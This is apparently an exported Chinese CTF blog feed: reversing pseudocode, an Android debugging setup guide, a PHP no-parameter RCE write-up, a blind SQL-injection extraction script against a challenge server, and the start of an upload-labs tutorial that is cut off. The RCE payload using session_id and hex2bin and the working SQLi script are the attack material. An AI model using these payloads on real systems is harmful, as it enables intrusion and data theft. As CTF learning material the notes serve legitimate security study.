class="params">(ptr)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int8 *__fastcall <span class="title">encode_front_part</span><span class="params">(<span class="type">unsigned</span> __int8 *base64ed_str_struct, <span class="type">unsigned</span> __int8 *dest_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *arr_str; <span class="comment">// r15</span></span><br><span class="line">  __int64 len; <span class="comment">// r12</span></span><br><span class="line">  __int64 i; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">char</span> xored_str_ptrr; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// rsi</span></span><br><span class="line">  __int128 xored_str_struct; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  xored_str_struct = <span class="number">0</span>;</span><br><span class="line">  ptr = <span class="number">0</span>;</span><br><span class="line">  arr_str = dest_ptr + <span class="number">1</span>;</span><br><span class="line">  len = *dest_ptr &gt;&gt; <span class="number">1</span>;                         <span class="comment">// dest/2=len</span></span><br><span class="line">  <span class="keyword">if</span> ( (*dest_ptr &amp; <span class="number">1</span>) != <span class="number">0</span> )                   <span class="comment">// 是堆</span></span><br><span class="line">  &#123;</span><br><span class="line">    arr_str = (<span class="type">unsigned</span> __int8 *)*((_QWORD *)dest_ptr + <span class="number">2</span>);</span><br><span class="line">    len = *((_QWORD *)dest_ptr + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != len; ++i )</span><br><span class="line">      std::string::<span class="built_in">push_back</span>((__int64)&amp;xored_str_struct, (<span class="type">char</span>)arr_str[i] ^ <span class="number">0x2Fu</span>);</span><br><span class="line">    xored_str_ptrr = xored_str_struct;</span><br><span class="line">    v6 = (<span class="type">int</span>)ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    xored_str_ptrr = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (<span class="type">char</span> *)&amp;xored_str_struct + <span class="number">1</span>;           <span class="comment">// std::string第二个元素</span></span><br><span class="line">  <span class="keyword">if</span> ( (xored_str_ptrr &amp; <span class="number">1</span>) != <span class="number">0</span> )              <span class="comment">// end=1</span></span><br><span class="line">    <span class="built_in">LODWORD</span>(v7) = v6;</span><br><span class="line">  <span class="built_in">simple_base64_encode</span>(base64ed_str_struct, (<span class="type">int</span>)v7);</span><br><span class="line">  <span class="keyword">if</span> ( (xored_str_struct &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(ptr)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> base64ed_str_struct;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 乱分的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓动态调试环境</title>
      <link href="/2025/05/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/"/>
      <url>/2025/05/10/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="apk处理"><a href="#apk处理" class="headerlink" title="apk处理"></a>apk处理</h2> <span id="more"></span><ul><li>apktool.jar和apktool.bat放在同一路径下，添加环境变量</li><li>解包apk</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解包到同名文件夹下mobile2</span></span><br><span class="line">apktool d mobile.apk</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑xml，在&lt;application&gt; 添加属性android:debuggable=&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压成apk 在 mobile2/dest</span></span><br><span class="line">apktool b ./mobile</span><br></pre></td></tr></table></figure><p><a href="https://ibotpeaches.github.io/Apktool/">apktool</a></p><ul><li>签名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#apksigner在SDK/build-tools下</span><br><span class="line">apksigner verify -v a.apk</span><br><span class="line"></span><br><span class="line">#\jdk-17\bin\keytool.exe</span><br><span class="line">keytool -genkey -v -keystore esg.jks -keyalg RSA -keysize 2048 -validity 10000 -alias esg</span><br><span class="line"></span><br><span class="line">apksigner sign --ks esg.jks --ks-key-alias esg --ks-pass pass:123456 --out mobile-signed.apk mobile.apk</span><br></pre></td></tr></table></figure><p><a href="https://mirrors.cloud.tencent.com/AndroidSDK/build-tools_r36_windows.zip">apksigner</a>(skd镜像下载build-tools_r36)</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>安卓9的模拟器可能会出现问题，无法获取寄存器值<br>报错<a href="https://github.com/skylot/jadx/issues/1826">JDWP Error Code:35</a><br><a href="https://www.pnfsoftware.com/blog/debugging-android-apps-on-android-pie-and-above/">另一个</a><br>夜神安卓7可以用正常调试<br>或mumu安卓12,部分寄存器读不出来<br>mumu没有离线安装包地址，抓包可获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /MuMuNG-setup-V4.1.25.3699-0426042611.exe HTTP/1.1</span><br><span class="line">User-Agent: aria2/1.36.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: a11.gdl.netease.com</span><br><span class="line">Range: bytes=560201728-612368383</span><br><span class="line">Want-Digest: SHA-512;q=1, SHA-256;q=1, SHA;q=0.1</span><br></pre></td></tr></table></figure><h3 id="jadx调试"><a href="#jadx调试" class="headerlink" title="jadx调试"></a>jadx调试</h3><p>使用夜神模拟器(安卓7.1.2)bin下的nox_adb.exe差不多版本的adb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure><ul><li>jadx打开mobile-signed.apk</li><li>点绿虫，打开的窗口上adb路径与connect设备的adb一致</li><li>点 <code>运行app</code> 按钮，device找到对应包名，双击包名可以附加</li><li>入口会自动断下，点击运行，直到程序正常</li><li>此时jadx调试</li></ul><p><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/jadx_dbg.png" alt="jadx" loading="lazy"></p><p>程序正常后，如果无法调试，红色暂停按钮变灰，右下角出现debuger exit<br>执行 <code>adb devices</code> 看不到设备<br>是因为adb版本和模拟器下的不同导致断联了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb --version</span><br><span class="line">Android Debug Bridge version 1.0.41</span><br><span class="line">Version 36.0.0-13206524</span><br><span class="line">Installed as C:\ADB\adb.exe</span><br><span class="line">Running on Windows 10.0.19045</span><br></pre></td></tr></table></figure><p>用本机的adb.exe替换模拟器位置下的nox_adb_bf.exe、nox_adb.exe、adb.exe三个文件<br>AdbWinApi.dll 和AdbWinUsbApi.dll也换成本机的<a href="https://blog.csdn.net/qq910689331/article/details/124115640">参考</a><br>直接从模拟器打开应用，jadx就可以直接附加调试，只是有时候寄存器取不到值<br>ida也可直接附加，不需要以debug启动app。</p><h3 id="ida调试so"><a href="#ida调试so" class="headerlink" title="ida调试so"></a>ida调试so</h3><h4 id="以debug启动app"><a href="#以debug启动app" class="headerlink" title="以debug启动app"></a>以debug启动app</h4><p> 没有这一步也能断，不知道会有什么影响</p><h5 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h5><details>  <summary><font color='greenyellow'>传统方法(展开)</font></summary><p> <strong>用这个方法调v7a，成功失败一次（报got SIGILL signal (Illegal instruction)），第二天就复现不出来了</strong><br>    没试过能不能调x86<br>下载android device monitor<a href="https://mirrors.cloud.tencent.com/AndroidSDK/tools_r25.2.5-windows.zip">镜像站下载tool-版本号.zip</a><br>运行\lib\monitor-x86_64，需要jdk8如果环境是高版本的，在monitor.ini指定javaw.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[+]-vm</span><br><span class="line">[+]C:\Environment\Java\jdk-1.8\bin\javaw.exe</span><br><span class="line">-vmargs</span><br><span class="line">-XX:MaxPermSize=256m</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>先打开monitor</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adb adb connect 127.0.0.1:62001</span><br><span class="line"><span class="comment">#以调试打开进程，monitor列表前面会有红色虫</span></span><br><span class="line">adb shell am start -D -n com.example.mobile02/.MainActivity <span class="comment">#包名/入口名</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">#此时先ida附加</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">#monitor查看(第5列)进程的转发端口一般是8600/8700,jdb转发到本地</span></span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700</span><br><span class="line"><span class="comment">#此时monitor的红色虫变绿</span></span><br></pre></td></tr></table></figure><ul><li>ida附加（和另一种方法一样）</li></ul></details><h5 id="另一种方法"><a href="#另一种方法" class="headerlink" title="另一种方法"></a>另一种方法</h5><details>  <summary><font color='greenyellow'>另一种方法(展开)</font></summary>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure><ul><li>jadx打开mobile-signed.apk</li><li>点绿虫</li><li>点 <code>运行app</code> 按钮，device找到对应包名，双击包名</li><li>入口会自动断下，点击运行，直到程序正常</li><li>关闭jadx，让程序自由运行</li><li>此时app卡在debug模式，ida可以附加</li></ul></details><h4 id="ida附加调试"><a href="#ida附加调试" class="headerlink" title="ida附加调试"></a>ida附加调试</h4><p>模拟器调v7a的so,用传统方法ida会报got SIGILL signal (Illegal instruction)<br>用另一种方法，ida断不下来，点也中止无法退出调试<br>然后调不了，所以只能调试x86版本的so</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:62001</span><br><span class="line">adb push C:\HelloCTF\Toolkit\IDA_Pro_9.1_protable\dbgsrv\android_x86_server /data/local/tmp</span><br><span class="line">adb shell</span><br><span class="line"> &gt;cd /data/local/tmp</span><br><span class="line"> &gt;chmod 777 *</span><br><span class="line"> &gt;./android_x86_server #-p 11111</span><br><span class="line"> </span><br><span class="line">#新开一个终端</span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure><p>ida打开x86版本的so<br>先下断点， <strong>在汇编下断才有用</strong></p><ul><li>ida选remote linux debuger</li></ul><p><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/ida_so.png" alt="jadx" loading="lazy"></p><ul><li><p>Debuger-&gt;attache to process...</p></li><li><p>找到包名，附加，F9运行，F7入，F8过，F5切换伪代码</p></li><li><p>Debuger-&gt;Use source-level debugging点一下使用源码调试<br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/Use_sorce.png" alt="jadx" loading="lazy"></p></li></ul><p>jdb –connect com.sun.jdi.SocketAttach:port&#x3D;8700,hostname&#x3D;127.0.0.1注意看connect前的&#39;-&#39;是有问题的，csdn浪费我很多时间</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>waydroid ，android13镜像调试</p><ul><li><p>按照文档安装waydroid 13镜像</p></li><li><p>使用<a href="https://github.com/casualsnek/waydroid_script">waydroid_script</a>安装magisk<br>因为脚本很久没更新，Zygisk可能无法开启</p></li><li><ul><li>按照 waydroid_script 的readme.md准备环境</li></ul></li><li><ul><li>修改waydroid_script&#x2F;stuff&#x2F;magisk.py 的下载链接</li></ul></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dl_link = &quot;https://github.com/mistrmochov/magiskdeltaorig/raw/main/app-release.apk&quot;</span></span><br><span class="line">dl_link = <span class="string">&quot;https://127.0.0.1:8000/app-release.apk&quot;</span></span><br></pre></td></tr></table></figure><ul><li><ul><li>到原链接下载旧版app-release.apk</li></ul></li><li><ul><li>再到<a href="https://github.com/1q23lyc45/KitsuneMagisk/releases">Kitsune Mask</a>下载新版app-release.apk</li></ul></li><li><ul><li>python -m http.server在8000开发服务后执行waydroid_script</li></ul></li><li><ul><li>利用重命名，先装旧的，再装新的，就可以使用Zygisk</li></ul></li><li>脚本安装 libndk libhoudini可以动态调试arm的so文件，但是很慢</li><li>脚本因为安装失败中断，需要手动卸载waydroid镜像<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount |grep waydroid</span><br><span class="line"><span class="built_in">sudo</span> umount -R /tmp/waydroid</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
          <category> mobile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> mobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php无参RCE</title>
      <link href="/2025/05/03/%E5%AD%A6/php_rce/php_%E6%97%A0%E5%8F%82rce/"/>
      <url>/2025/05/03/%E5%AD%A6/php_rce/php_%E6%97%A0%E5%8F%82rce/</url>
      
        <content type="html"><![CDATA[<p>无参RCE</p> <span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>利用http头注入，php8用end()获取自定义头X-Cmd,<br>远程是php7,用reset()获取<br><img src="/images/%E5%AD%A6/php_rce/1.png" alt="img" loading="lazy"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\|\|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="comment">//?tgctf2025=session_start();system(hex2bin(session_id()));</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>用session传入命令，先要session_start()。<br>发现数字除了2全部过滤，用hex2bin<br><img src="/images/%E5%AD%A6/php_rce/2.png" alt="img" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezsql前半段</title>
      <link href="/2025/04/20/%E5%AD%A6/sqli-labs/ezsql%5Bxyctf2025%5D/"/>
      <url>/2025/04/20/%E5%AD%A6/sqli-labs/ezsql%5Bxyctf2025%5D/</url>
      
        <content type="html"><![CDATA[<p>1<br> <span id="more"></span></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">tab=unquote(<span class="string">&#x27;%09&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://80-6e92aa02-4dc4-4925-bb48-be3d19ad8d79.challenge.ctfplus.cn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmptst</span>(<span class="params">c,idx=<span class="number">0</span></span>):</span><br><span class="line">    idx=<span class="built_in">str</span>(idx)</span><br><span class="line">    <span class="comment">#or%090%09order%09by%093 order by 3报错 2列</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; select=f&quot;select group_concat(schema_name) from information_schema.schemata&quot; &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#数据库结果：information_schema,testdb,mysql,sys,performance_schema,test</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; select=f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;testdb&#x27;&quot; &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#表：double_check,user</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;select=&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;&quot;#secret&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#double_check (secret</span></span><br><span class="line">    <span class="comment">#user username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Relo</span></span><br><span class="line">    select=<span class="string">&quot;select secret from double_check&quot;</span><span class="comment">#dtfrtkcc0czkoua9S</span></span><br><span class="line"></span><br><span class="line">    payload=<span class="string">f&quot;&#x27; or <span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>&gt;ASCII(SUBSTR((<span class="subst">&#123;select&#125;</span>) from <span class="subst">&#123;idx&#125;</span> for 1))#&quot;</span></span><br><span class="line"></span><br><span class="line">    payload=payload.replace(<span class="string">&#x27; &#x27;</span>,tab)</span><br><span class="line">    data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">         <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;111&quot;</span>&#125;</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    res=requests.post(url=url,data=data) <span class="comment">#注入 c &gt; str切片(idx,1) #结果为真执行ret 1</span></span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    t=fnmatch.fnmatch(res.text,<span class="string">&#x27;*帐号或密码错误*&#x27;</span>)</span><br><span class="line">    t=<span class="keyword">not</span> t</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span>(t) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">l,r,cmp,idx</span>): </span><br><span class="line">    p=r//<span class="number">2</span> - l</span><br><span class="line">    <span class="keyword">while</span>(r-l&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(cmp(<span class="built_in">chr</span>(p) , idx)):<span class="comment">#大于</span></span><br><span class="line">            r=p</span><br><span class="line">            p=p-(p-l)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=p</span><br><span class="line">            p=p+(r-p)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(l)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    a+=find(<span class="number">0</span>,<span class="number">127</span>,cmptst,i)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs-1到11</title>
      <link href="/2024/12/07/%E5%AD%A6/upload-labs/upload-labs-1_5/"/>
      <url>/2024/12/07/%E5%AD%A6/upload-labs/upload-labs-1_5/</url>
      
        <content type="html"><![CDATA[<h2 id="搭建upload-labs"><a href="#搭建upload-labs" class="headerlink" title="搭建upload-labs"></a>搭建upload-labs</h2><p>kali下使用docker搭建</p><ul><li>安装docker<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update&amp;&amp;<span class="built_in">sudo</span> apt upgrade -y</span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br><span class="line">service docker start</span><br></pre></td></tr></table></figure></li><li>拉取镜像并在80端口启动<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker pull c0ny1/upload-labs</span><br><span class="line"><span class="built_in">sudo</span> docker images</span><br><span class="line"><span class="built_in">sudo</span> docker run -d -p 80:80 c0ny1/upload-labs </span><br><span class="line"><span class="comment">#没有upload文件，手动创建并授权</span></span><br><span class="line"><span class="built_in">sudo</span> docker ps</span><br><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it &#123;upload-labs 的 CONTAINER ID&#125; /bin/bash</span><br><span class="line"><span class="built_in">mkdir</span> upload</span><br><span class="line"><span class="built_in">chmod</span> 777 upload</span><br></pre></td></tr></table></figure></li><li>查看运行中的镜像，选择并关闭<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker ps</span><br><span class="line"><span class="built_in">sudo</span> docker stop &#123;CONTAINER ID&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="pass-1"><a href="#pass-1" class="headerlink" title="pass-1"></a>pass-1</h2><p>第一关使用储存在前端的js过滤文件，直接审查元素改js脚本不起作用。<br>因为浏览器已经加载脚本到内存中了，需要抓包修改响应，<del>或添加覆盖脚本</del></p><h4 id="抓包修改响应"><a href="#抓包修改响应" class="headerlink" title="抓包修改响应"></a>抓包修改响应</h4><p>brup suit 开启抓包 intercept on，<br>刷新页面，抓到的请求后，点action-&gt;do intercept-&gt; response to this resquest<br><img src="/images/%E5%AD%A6/upload-labs/1.1.png" alt="试试图片" loading="lazy"><br>新版直接右键抓到的条目-&gt;do intercept-&gt;...<br>forward 抓到响应包，修改js，再forward</p><h4 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h4><p>php添加不了覆盖脚本，试试暴力猴添加用户脚本删除dom tree</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>)[<span class="number">5</span>].<span class="title function_">remove</span>()</span><br></pre></td></tr></table></figure><p>然而并不行。</p><ul><li>onsubmit属性在return false时不提交请求<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return 